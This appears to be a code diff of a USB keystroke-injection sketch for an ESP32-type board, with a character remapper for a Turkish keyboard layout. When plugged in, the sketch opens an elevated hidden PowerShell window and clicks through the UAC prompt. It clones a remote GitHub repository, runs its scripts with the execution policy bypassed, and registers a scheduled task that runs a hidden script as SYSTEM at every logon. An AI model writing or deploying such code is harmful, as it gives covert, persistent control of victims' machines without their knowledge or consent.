@@ -1,8 +1,5 @@
 #include "USB.h"
-
 #include "USBHIDKeyboard.h"
-
-
 
 USBHIDKeyboard Keyboard;
 
@@ -11,29 +8,26 @@ void trPrint(const String &text) {
     char c = text[i];
 
     switch (c) {
-     
-      case '"':
+      case 'i':
         Keyboard.write('\'');
         break;
 
-      
-      case 'i':
-        Keyboard.write(']');
+      case '"':
+        Keyboard.press(KEY_LEFT_SHIFT);
+        Keyboard.write('2');
+        Keyboard.release(KEY_LEFT_SHIFT);
         break;
 
-     
       case '.':
         Keyboard.write('/');
         break;
 
-  
       case ':':
         Keyboard.press(KEY_LEFT_SHIFT);
         Keyboard.write('/');
         Keyboard.release(KEY_LEFT_SHIFT);
         break;
 
-     
       case '/':
         Keyboard.press(KEY_LEFT_SHIFT);
         Keyboard.write('7');
@@ -42,7 +36,7 @@ void trPrint(const String &text) {
 
       case '\\':
         Keyboard.press(KEY_RIGHT_ALT);
-        Keyboard.press('-');
+        Keyboard.write('q');
         delay(10);
         Keyboard.releaseAll();
         break;
@@ -51,7 +45,6 @@ void trPrint(const String &text) {
         Keyboard.write('=');
         break;
 
-      
       case '_':
         Keyboard.press(KEY_LEFT_SHIFT);
         Keyboard.write('=');
@@ -59,7 +52,6 @@ void trPrint(const String &text) {
         break;
 
       default:
-        
         if (c >= 'A' && c <= 'Z') {
           Keyboard.press(KEY_LEFT_SHIFT);
           Keyboard.write(tolower(c));
@@ -70,156 +62,63 @@ void trPrint(const String &text) {
         break;
     }
 
-    delay(12);
+    delay(15);
   }
 }
 
-
-
 void setup() {
-
   USB.begin();
-
   Keyboard.begin();
 
-
-
- 
-
-  delay(2000);
-
-
-
+  delay(3000);
 
   Keyboard.press(KEY_LEFT_GUI);
-
   Keyboard.press('r');
-
   delay(100);
-
   Keyboard.releaseAll();
+  delay(600);
 
-  delay(500);
-
-
-
-
-  Keyboard.print("cmd");
-
+  trPrint("powershell -w h");
   delay(100);
 
   Keyboard.press(KEY_LEFT_CTRL);
-
   Keyboard.press(KEY_LEFT_SHIFT);
-
   Keyboard.write(KEY_RETURN);
-
   Keyboard.releaseAll();
 
-  delay(1200);
-
-
+  delay(2000); 
 
   Keyboard.write(KEY_LEFT_ARROW);
-
   delay(400);
-
   Keyboard.write(KEY_RETURN);
-
-  delay(1500);
-
-
-
-
-
-  trPrint("powershell");
-
-  delay(300);
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(1000);
-
-
-
-
-
- 
-
-  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(4000);
-
-
-
-
-  trPrint("cd BashExe");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(500);
-
-
-
-  
-
-  trPrint(".\\app.sh");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(3000);
-
-
-
-  Keyboard.press(KEY_LEFT_ALT);
-
-  Keyboard.press(KEY_F4);
-
   delay(100);
 
-  Keyboard.releaseAll();
+  trPrint("git clone https://github.com/SoyluEren2004/BashExe.git");
+  Keyboard.write(KEY_RETURN);
+  delay(4000);
 
-  delay(500);
+  trPrint("cd BashExe");
+  Keyboard.write(KEY_RETURN);
 
-  Keyboard.write(KEY_LEFT_ARROW);
-
+  trPrint("powershell.exe -NoProfile -ExecutionPolicy Bypass -File change.ps1");
+  Keyboard.write(KEY_RETURN);
+  delay(400);
+  
+  Keyboard.print("$action = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\WINDOWS\\system32\\BashExe\\prts.ps1\" -WorkingDirectory \"C:\\WINDOWS\\system32\\BashExe\"; $trigger = New-ScheduledTaskTrigger -AtLogOn; $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries; Register-ScheduledTask -TaskName \"MasaustuPrtsGorevi\" -Action $action -Trigger $trigger -Settings $settings -User \"NT AUTHORITY\\SYSTEM\" -Force");
+  delay(800);
+  Keyboard.write(KEY_RETURN);
+  delay(800);
+  
+  Keyboard.print("powershell.exe -NoProfile -ExecutionPolicy Bypass -File prts.ps1");
+  Keyboard.write(KEY_RETURN);
   delay(400);
 
+  Keyboard.print("exit");
+  delay(400);
   Keyboard.write(KEY_RETURN);
+  
+}
 
-  delay(1500);
-
- 
-
-  trPrint("cd ..");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(1500);
-
-
-
-  trPrint("Remove-Item -Path BashExe -Recurse -Force");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(3000);
-
-
-
-  trPrint("exit");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(300);
-
-  trPrint("exit");
-
-  Keyboard.write(KEY_RETURN);
-
-  delay(300);
-
+void loop() {
 
 }
